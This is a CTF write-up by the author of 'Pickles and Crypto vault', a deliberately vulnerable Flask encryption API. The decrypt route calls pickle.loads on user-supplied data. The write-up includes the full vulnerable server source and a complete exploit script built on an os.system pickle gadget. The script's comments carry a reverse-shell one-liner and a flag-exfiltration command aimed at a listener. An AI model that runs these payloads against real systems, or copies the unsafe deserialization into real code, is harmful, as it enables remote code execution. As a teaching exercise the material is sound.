---
author: Supaaasuge
title: L3AK CTF - Pickled crypto vault
date: 2024-06-01
Lastmod: 2024-06-01
description: "Writeup for Pickled and crypto vault, a Web challenge I created for L3AK CTF"
categories:
  - CTF
tags:
  - Cryptography
  - Web
  - RCE
---
# Pickles and Crypto vault
**Difficulty**: Easy
**Category**: Web

## Resources
- [exploit-notes.hdks - Python Pickle RCE](https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/)
- [Pickles deserialization RCE explaination](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

## Description
Pickles and crypto? What a concept.

This challenge involves a flask RESTful web application with endpoints for user registration, login, key upload, and decryption/encryption. The application uses JWT for authentication, RSA for encryption/decryption of user supplied data, and AES-CBC-256 for database security using a SHA256 hash of the user's password as the AES key for RSA keys stored in-memory.

To get the flag in this challenge, the intended solution was to leverage the python `pickle` library to obtain RCE on the host. The vulnerable piece of code is in the Decrypt route:
```python
rsacipher = PKCS1_OAEP.new(private_key)
            decrypted_data = rsacipher.decrypt(decoded_data)
            try:
                jsonsafe_plaintext = pickle.loads(decrypted_data)
                resp = jsonsafe_plaintext
            except Exception as e:
```
`pickle.loads(decrypted_data)`.

To obtain RCE, we can easily craft an exploit payload as follows:
```python
class exe(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))
```
Then, to get the flag we very simply register a new user, login, upload our keys, craft a malicious payload then send to be decrypted, then we send the encrypted malicious payload we just retrieved from the previous request to be decrypted... and voila, you should get RCE. The tricky part here is you do not get the response of the shell command back from the server. Only the error response code's (0, 1, etc.)

The exploit flow can be seen as follows:
```python

# To get a reverse shell and get the flag:
# python exp.py --action exploit --payload "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"LOCAL_IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
#
#
# or to get the flag directly:
# start a netcat listener
# `nc -lvnp PORT` 
# python exploit.py --action exploit --payload "sh -c 'cat flag.txt | LOCAL_IP PORT'"
#
.
.
.
def exploit(payload):
    """This function demonstrates how to exploit the API using a given payload"""
    user = 'user123' + get_random_string(5)
    password = 'password1'
    public_key='./public_key.pem'
    private_key = './private_key.pem'
    # Register a new user
    tokenval = register(user, password)
    # Login as the new user
    login(user, password, tokenval)
    # Upload key pair
    upload_key(tokenval, password, public_key, private_key)

    
    # Craft the payload using pickle
    instance = exe(payload)
    malicious_data = pickle.dumps(instance)
    maliciousEncoded = base64.urlsafe_b64encode(malicious_data).decode()
    
    # Encrypt the payload
    headers = {'Authorization': tokenval}
    # payload
    exploit = encrypt(tokenval, password, maliciousEncoded, public_key=public_key)
    tmpdata = base64.urlsafe_b64encode(b'testing testing 123').decode()
    print_colored(f"Sending a test payload {tmpdata}", "bg_bright_magenta")
    # sending tmpdata for encryption
    exp = encrypt(tokenval, password, tmpdata, public_key=public_key)
    # This is where RCE occurs.
    dec = decrypt(tokenval, exp, password)
    print_colored(f"Sending the exploit payload {exploit}", "bg_bright_magenta")

    print_colored(f"\n\nEncrypted tmpdata {exp}", "bg_bright_magenta")
    print_colored(f"Encrypted Payload = {exploit}\n", "bg_bright_magenta")
    # Setup payload
    payload = {
        'encrypted_data': exploit,
        'password': password,
    }
    response = requests.post(f'{API_BASE_URL}/decrypt', json=payload, headers=headers)
    if response.status_code == 200:
        print_colored('Exploit executed successfully.', 'green')
        print(response.json())
    else:
        print(response.json())
        print_colored('\nExploit execution failed.\n', 'red')
```
**Challenge source code**
```python
from flask import Flask, request
from flask_restful import Resource, Api
import jwt, os, base64, pickle
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from functools import wraps
app = Flask(__name__)
api = Api(app)

JWT_SECRET = os.urandom(32)  
users = {}

class db_cipher:
    def __init__(self, key):
        self.key = key
        self.bs = AES.block_size
        self.pad = lambda data: pad(data, self.bs)
        self.unpad = lambda data: unpad(data, self.bs)
    
    def encrypt(self, raw):
        iv = get_random_bytes(self.bs)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        data = self.pad(raw)
        return base64.urlsafe_b64encode(iv + cipher.encrypt(data)).decode()
    
    def decrypt(self, enc):
        data = base64.urlsafe_b64decode(enc.encode())
        iv = data[:self.bs]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.unpad(cipher.decrypt(data[self.bs:]))
    

def login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return {'message': 'Token is missing'}, 400

        try:
            payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            username = payload['username']
            if username not in users:
                return {'message': 'Invalid token'}, 400
        except jwt.InvalidTokenError:
            return {'message': 'Invalid token'}, 400
        return func(*args, **kwargs)
    return wrapper


class Register(Resource):

    def get(self):
        return {'message': 'Please use POST request'}, 400

    def post(self):
        data = request.json
        if not data:
            return {'message': 'JSON data is missing'}, 400
        username = data.get('username')
        password = data.get('password')
        if username in users:
            return {'message': 'Username already exists'}, 400
        if not username or not password:
            return {'message': 'Username and password are required'}, 400
        try:
            token = jwt.encode({'username': username}, JWT_SECRET, algorithm='HS256')
        except:
            return {'message': 'Error generating token'}, 500
        hashed_password = SHA256.new(password.encode()).digest()
        users[username] = {
            'password': hashed_password,
            'token': token, 
            'keys': {'public': [], 'private': []}
            }
        return {'token': token}, 200

class Login(Resource):

    def get(self):
        return {'message': 'Please use POST request'}, 400

    def post(self):
        token = request.headers.get('Authorization')
        if not token:
            return {'message': 'Token is missing'}, 400
        try:
            payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            username = payload['username']
        except jwt.InvalidTokenError:
            return {'message': 'Invalid token'}, 400
        data = request.json
        if not data:
            return {'message': 'JSON data is missing'}, 400

        password = data.get('password')
        hashed_password = SHA256.new(password.encode()).digest()
        if not username or not password:
            return {'message': 'Username and password are required'}, 400
        
        if username not in users or hashed_password != users[username]['password']:
            return {'message': 'Invalid username or password'}, 400
        
        if token != users[username]['token']:
            return {'message': 'Invalid token'}, 400
        return {'message': 'Login successful!', 'token': token}, 200

class UploadKey(Resource):
    def get(self):
        return {'message': 'Please use POST request'}, 400
    
    @login_required
    def post(self):
        token = request.headers.get('Authorization')
        if not token:
            return {'message': 'Authentication token required.'}, 400
        
        try:
            payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            username = payload['username']
        except jwt.InvalidTokenError:
            return {'message': 'Invalid token'}, 400
        
        data = request.json
        if not data:
            return {'message': 'JSON data is missing'}, 400
        
        pubkey_data = data.get('public_key')
        privkey_data = data.get('private_key')

        password = data.get('password')
        password_hash = SHA256.new(password.encode()).digest()
        if password_hash != users[username]['password']:
            return {'message': 'Invalid password'}, 400

        if not all([pubkey_data, privkey_data, password]):
            return {'message': 'Key data and/or password is missing.'}, 400
        
        try:
            pubkey_bytes = base64.urlsafe_b64decode(pubkey_data)
        except Exception as e:
            return {"message":f"Error: {e}. Make sure the keys are base64 encoded."}
        
        cipher = db_cipher(password_hash)
        try:
            privkey_bytes = base64.urlsafe_b64decode(privkey_data)
        except Exception as e:
            return {"message":f"Error: {e}. Make sure the keys are base64 encoded."}
        try:
            encrypted_privkey = cipher.encrypt(privkey_bytes)
        except Exception as e:
            return {'message': f'Error: {e} while encrypting key. Make sure the key is base64 encoded.'}, 400
        users[username]['keys']['public'].append(pubkey_bytes)
        users[username]['keys']['private'].append(encrypted_privkey)
        return {'message': f'[#{username}#]$ - Key uploaded successfully", "public": "(b64){base64.urlsafe_b64encode(pubkey_bytes).decode()}', 'fingerprint': SHA256.new(pubkey_bytes).hexdigest()}, 200

class Encrypt(Resource):

    def get(self):
        return {'message': 'Please use POST request'}, 400

    def post(self):
        token = request.headers.get('Authorization')
        data = request.json

        if not token:
            return {'message': 'Token is missing'}, 400
        try:
            payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            username = payload['username']
        except jwt.InvalidTokenError:
            return {'message': 'Invalid token'}, 400
        password = data.get('password')
        if not password:
            return {'message': 'Password is missing'}, 400
        password_hash = SHA256.new(password.encode()).digest()
        if password_hash != users[username]['password']:
            return {'message': 'Invalid password'}, 400
        
        public_key64 = data.get('public_key')
        if not public_key64:
            return {'message': '(Base64)Public key used for encryption is missing.'}, 400
        
        try:
            key_data = base64.urlsafe_b64decode(public_key64)
            rsakey = RSA.import_key(key_data)
        except Exception as e:
            return {"message":f"Error: {e}. Make sure the key is base64 encoded."}
        
        
        encoded_plaintext = data.get('data')
        if not data:
            return {'message': 'data is missing'}, 400
        
        try:
            decoded_plaintext = base64.urlsafe_b64decode(encoded_plaintext)
        except Exception as e:
            return {"message":f"Error: {e}. Make sure the data is base64 encoded."}
        
        try:
            cipher = PKCS1_OAEP.new(rsakey)
            encrypted_data = cipher.encrypt(decoded_plaintext)
        except Exception as e:
            return {'message': f'Encryption failed: {e}'}, 500
        return {'encrypted_data': base64.urlsafe_b64encode(encrypted_data).decode()}, 200

class Decrypt(Resource):

    def get(self):
        return {'message': 'Please use POST request'}, 400

    @login_required
    def post(self):
        data = request.json
        token = request.headers.get('Authorization')
        if not token:
            return {'message': 'Authorization Token Header is missing'}, 400
        
        try:
            payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            username = payload['username']
        except jwt.InvalidTokenError:
            return {'message': 'Invalid token'}, 400
        
        encrypted_data = data.get('encrypted_data')
        print(encrypted_data)
        if not encrypted_data:
            return {'message': 'Encrypted data is missing'}, 400
        try:
            decoded_data = base64.urlsafe_b64decode(encrypted_data)
        except Exception as e:
            return {"message":f"Error: {e}. Make sure the data is base64 encoded."}, 400
        
        password = data.get('password')
        print(password)
        if not password:
            return {'message': 'Password is missing'}, 400
        password_hash = SHA256.new(password.encode()).digest()
        print(password_hash)
        if password_hash != users[username]['password']:
            return {'message': 'Invalid password'}, 400
        try:
            cipher = db_cipher(password_hash)
            encrypted_private_key = users[username]['keys']['private'][0]
            decrypted_key_data = cipher.decrypt(encrypted_private_key)
        except Exception as e:
            return {'message': f'Error: {e} while decrypting key. Make sure you have uploaded a key pair.'}, 400
        
        try:
            private_key = RSA.import_key(decrypted_key_data)
        except Exception as e:
            return {"message":f"Error: {e} while importing key. Make sure you have uploaded a key pair."}
        try:
            rsacipher = PKCS1_OAEP.new(private_key)
            decrypted_data = rsacipher.decrypt(decoded_data)
            try:
                jsonsafe_plaintext = pickle.loads(decrypted_data)
                resp = jsonsafe_plaintext
            except Exception as e:

                return {'decrypted_data': f'{decrypted_data}'}, 200
        except Exception as e:
            return {'decrypted_data': f'{e}'}, 400
        return {'decrypted_data': jsonsafe_plaintext}, 200
    

api.add_resource(Register, '/apiv1/register')
api.add_resource(Login, '/apiv1/login')
api.add_resource(UploadKey, '/apiv1/uploadkey')
api.add_resource(Encrypt, '/apiv1/encrypt')
api.add_resource(Decrypt, '/apiv1/decrypt')

if __name__ == '__main__':
    app.run(debug=True)
```

Endpoints and Their Functions

- Registration (`/apiv1/register`):
    - Method: POST
    - Description: Register a new user with a username and password.
`cURL` Example:

```sh
    curl -X POST http://localhost:5000/apiv1/register -H "Content-Type: application/json" -d '{"username":"user1", "password":"password123"}'
```
- Login (`/apiv1/login`):
    - Method: POST
    - Description: Login to obtain a token.
`cURL` Example:

```sh
curl -X POST http://localhost:5000/apiv1/login -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"password":"password123"}'
```

- Upload Key (`/apiv1/uploadkey`):
    - Method: POST
    - Description: Upload a public/private key pair. The private key is encrypted and stored.
`cURL` Example:

```sh
curl -X POST http://localhost:5000/apiv1/uploadkey -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"public_key":"<base64_pubkey>", "private_key":"<base64_privkey>", "password":"password123"}'
```

- Encrypt Data (`/apiv1/encrypt`):
    - Method: POST
    - Description: Encrypt data using the uploaded public key.
`cURL` Example:

```sh
curl -X POST http://localhost:5000/apiv1/encrypt -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"public_key":"<base64_pubkey>", "data":"<base64_data>", "password":"password123"}'
```

- Decrypt Data (`/apiv1/decrypt`):
    - Method: POST
    - Description: Decrypt data using the stored private key.
`cURL` Example:

```sh
curl -X POST http://localhost:5000/apiv1/decrypt -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"encrypted_data":"<base64_encrypted_data>", "password":"password123"}'
```

**Source Code Explanation**

Imports and Initial Setup:
- Import necessary modules and initialize the Flask app and API.
- Generate a random JWT secret and initialize a users dictionary.

- `db_cipher` Class:
    - Handles AES encryption and decryption for securely storing private keys.

- `login_required` Decorator:
    - A decorator to enforce JWT authentication on protected endpoints.

- Register Endpoint:
    - Registers a new user, stores hashed passwords, and issues a JWT token.

- Login Endpoint:
    - Authenticates a user using the provided JWT token and password.

- UploadKey Endpoint:
    - Allows logged-in users to upload public and private keys. The private key is encrypted with AES before storing.

- Encrypt Endpoint:
    - Encrypts provided data using the uploaded public key.

- Decrypt Endpoint:
    - Decrypts provided data using the stored private key.

#### How to Interact with Each Endpoint Using `cURL`

Register a New User:

```sh
curl -X POST http://localhost:5000/apiv1/register -H "Content-Type: application/json" -d '{"username":"user1", "password":"password123"}'
```
Login:

```sh
curl -X POST http://localhost:5000/apiv1/login -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"password":"password123"}'
```

Upload Key:

```sh
curl -X POST http://localhost:5000/apiv1/uploadkey -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"public_key":"<base64_pubkey>", "private_key":"<base64_privkey>", "password":"password123"}'
```
Encrypt Data:

```sh
curl -X POST http://localhost:5000/apiv1/encrypt -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"public_key":"<base64_pubkey>", "data":"<base64_data>", "password":"password123"}'
```

Decrypt Data:

```sh
curl -X POST http://localhost:5000/apiv1/decrypt -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"encrypted_data":"<base64_encrypted_data>", "password":"password123"}'
```

## Solution
```python
import requests
import argparse
import base64
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import sys
import pickle, os
from Crypto.Cipher import PKCS1_OAEP
from utils import print_colored
# To get a reverse shell and get the flag:
# python exp.py --action exploit --payload "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"LOCAL_IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
#
#
# or to get the flag directly:
# start a netcat listener
# `nc -lvnp PORT` 
# python exploit.py --action exploit --payload "sh -c 'cat flag.txt | LOCAL_IP PORT'"
#

API_BASE_URL = 'http://172.17.0.2:5000/apiv1'

def register(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(f'{API_BASE_URL}/register', json=payload)
    token = None  
    if response.status_code == 200:  
        token = response.json().get('token') 
        hashed = SHA256.new(password.encode()).hexdigest()
        print_colored(f'Registration successful using {username}:{password}\nSHA256: {hashed}\nToken: {token}\n\n', 'green')
        print(f"Full response = {response.json()}")
    else:
        print('Registration failed.')
        print(response.json())
    return token




def login(username, password, token):
    payload = {'username': username, 'password': password}
    headers = {'Authorization': token}
    response = requests.post(f'{API_BASE_URL}/login', json=payload, headers=headers)
    print(f"Sending to: {API_BASE_URL}/login\nusername={username}\ntoken={token}\n")
    if response.status_code == 200:
        token = response.json()['token']
        print_colored(f'Login successful. Token: {token}', 'bright_green')
    else:
        print_colored('Login failed.', 'red')

def upload_key(token, password, key_file=None, privkeyfile=None):
    if key_file is None:
        key_file = './public_key.pem'
    if privkeyfile is None:
        privkeyfile = './private_key.pem'
    print_colored(f"Uploading keys: {key_file} and {privkeyfile}...\n", "bright_yellow")
    with open(key_file, 'rb') as file:
        key_data = file.read()
    with open(privkeyfile, "rb") as f:
        data= f.read()
    
    priv_key_base64 = base64.urlsafe_b64encode(data).decode()
    key_base64 = base64.urlsafe_b64encode(key_data).decode()
    payload = {
        'public_key': key_base64,
        'private_key':priv_key_base64, 
        'password':password
        }
    headers = {'Authorization': token}
    print_colored(f"Uploading keys: {API_BASE_URL}/uploadkey...\nkey = {key_base64}\n", "bright_yellow")
    response = requests.post(f'{API_BASE_URL}/uploadkey', json=payload, headers=headers)
    
    if response.status_code == 200:

        print_colored('Key uploaded successfully.\n', 'bright_green')
        print(response.json())
    else:
        print(response.json())
        print_colored('\nKey upload failed.\n', 'red')

def encrypt( token,password, data, public_key=None):

    if public_key is None:
        public_key = './public_key.pem'
    print_colored(f"Initiating the encryption proces...Public Key file = {public_key}\n", "bright_yellow")
    with open(public_key, 'rb') as file:
        key_data = file.read()
    publicKey = base64.urlsafe_b64encode(key_data).decode()
    payload = {
        'data': data, 
        'public_key': publicKey, 
        'password':password
        }
    headers = {
        'Authorization': token
        }
    response = requests.post(f'{API_BASE_URL}/encrypt', json=payload, headers=headers)
    print_colored(f"Sending: {data} to be encrypted using token = {token}\n", "yellow")
    if response.status_code == 200:
        print_colored(f"Response = {response.content}", "bright_green")
        encrypted_data = response.json()['encrypted_data']
        print_colored(f'\nEncrypted data: {encrypted_data}', "magenta")
        return encrypted_data
    else:
        print_colored(response.content, "red")
        print_colored('Encryption failed.', 'red')


def decrypt(token, encrypted_data, password):
    payload = {
        'encrypted_data': encrypted_data, 
        'password':password
        }
    headers = {'Authorization': token}
    response = requests.post(f'{API_BASE_URL}/decrypt', json=payload, headers=headers)
    if response.status_code == 200:
        print(response.content)
        decrypted_data = response.json()['decrypted_data']
        print_colored(f'Decrypted data: {decrypted_data}', 'green')
    else:
        print(response.content)
        print_colored(response.json(), "bright_red")
        print_colored('Decryption failed.', "blue")

def generate_key(name):
    if name == None:
        name = 'RSA'
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    with open(f'{name}_private_key.pem', 'wb') as file:
        file.write(private_key)
    with open(f'{name}_public_key.pem', 'wb') as file:
        file.write(public_key)
    print('Key pair generated successfully.')




class exe(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


import random, string
def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    print("Random string of length", length, "is:", result_str)
    return result_str

def exploit(payload):
    """This function demonstrates how to exploit the API using a reverse shell payload"""
    user = 'user123' + get_random_string(5)
    password = 'password1'
    public_key='./public_key.pem'
    private_key = './private_key.pem'
    # Register a new user
    tokenval = register(user, password)
    # Login as the new user
    login(user, password, tokenval)
    # Upload key pair
    upload_key(tokenval, password, public_key, private_key)

    
    # Craft the payload using pickle
    instance = exe(payload)
    malicious_data = pickle.dumps(instance)
    maliciousEncoded = base64.urlsafe_b64encode(malicious_data).decode()
    
    # Encrypt the payload
    headers = {'Authorization': tokenval}
    # payload
    exploit = encrypt(tokenval, password, maliciousEncoded, public_key=public_key)
    tmpdata = base64.urlsafe_b64encode(b'testing testing 123').decode()
    print_colored(f"Sending a test payload {tmpdata}", "bg_bright_magenta")
    # sending tmpdata for encryption
    exp = encrypt(tokenval, password, tmpdata, public_key=public_key)
    # This is where RCE occurs.
    dec = decrypt(tokenval, exp, password)
    print_colored(f"Sending the exploit payload {exploit}", "bg_bright_magenta")

    print_colored(f"\n\nEncrypted tmpdata {exp}", "bg_bright_magenta")
    print_colored(f"Encrypted Payload = {exploit}\n", "bg_bright_magenta")
    # Setup payload
    payload = {
        'encrypted_data': exploit,
        'password': password,
    }
    response = requests.post(f'{API_BASE_URL}/decrypt', json=payload, headers=headers)
    if response.status_code == 200:
        print_colored('Exploit executed successfully.', 'green')
        print(response.json())
    else:
        print(response.json())
        print_colored('\nExploit execution failed.\n', 'red')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='API Client')
    parser.add_argument('--action', choices=['register', 'login', 'upload-key', 'encrypt', 'decrypt', 'exploit', 'generate-key'], required=True, help='Action to perform')
    parser.add_argument('--pubkey',  help='Path to the public key file')
    parser.add_argument('--privkey',  help='Path to the private key file')
    parser.add_argument('--password', help='Password to use if required.')
    parser.add_argument('--username', help='Username to use if required.')
    parser.add_argument('--login', help='Login with a username')
    parser.add_argument('--plaintext', help='Plaintext data to Encrypt.')
    parser.add_argument('--ciphertext', help='Decrypt ciphertext data.')
    parser.add_argument('--payload',help='Exploit the API')
    parser.add_argument('--token', help='Authentication token to provide as a Header as Authorization: {token} if required.')
    parser.add_argument('--kp-name', help='Name of the keypair for generate-key action')

    args, unknown = parser.parse_known_args()
    if args.action in ['register', 'login']:
        if not args.username:
            parser.error('--username <username> --password <password> is required for this action.')
        if not args.password:
            parser.error('--username <username> --password <password> is required for this action.')
    
    if args.action in ['login', 'upload-key', 'encrypt', 'decrypt']:
        if not args.token:
            parser.error('--token is required for this action.')

    if args.action == 'upload-key':
        if not args.pubkey or not args.privkey:
            parser.error('--pubkey <file> --privkey <file> --token <token> --password <password> are required for this action.')
        else:
            upload_key(args.token, args.password, args.pubkey, args.privkey)

    if args.action == 'encrypt':
        if not args.plaintext or not args.pubkey:
            parser.error('--plaintext <plaintext> --pubkey <file> --password <password> --token <token> is required for this action.')
        else:
            encrypt(args.token, args.password, base64.urlsafe_b64encode(args.plaintext.encode()).decode(), args.pubkey)

    if args.action == 'decrypt':
        if not args.ciphertext:
            parser.error("--ciphertext <data> --password <password> --username <username> --token <token> is required for the decrypt action.")
        else:
            decrypt(args.token, args.ciphertext, args.password)
    if args.action == 'exploit':
        if not args.payload:
            parser.error("--payload <Reverse-shell-payload> is required for the exploit action.")
        else:
            exploit(args.payload)
            print_colored(f"Exploit function called using {args.payload}", 'yellow')
    if args.action == 'register':
        if not args.username or not args.password:
            print_colored("python3 exploit.py --username <username> --password <password> are required for the register action.", 'red')
            sys.exit(1)
        else:
            val = register(args.username, args.password)
            print_colored(f"Registration function called using {args.username}:{args.password}", 'yellow')

    if args.action == 'login':
        if not args.username or not args.password:
            print_colored("python3 exploit.py --token <token> --username <username> --password <password> are required for the login action.", 'red')
            sys.exit(1)
        else:
            login(args.username, args.password, args.token)
            print_colored(f"Login function called using {args.username}:{args.password}:{args.token}", 'yellow')
```
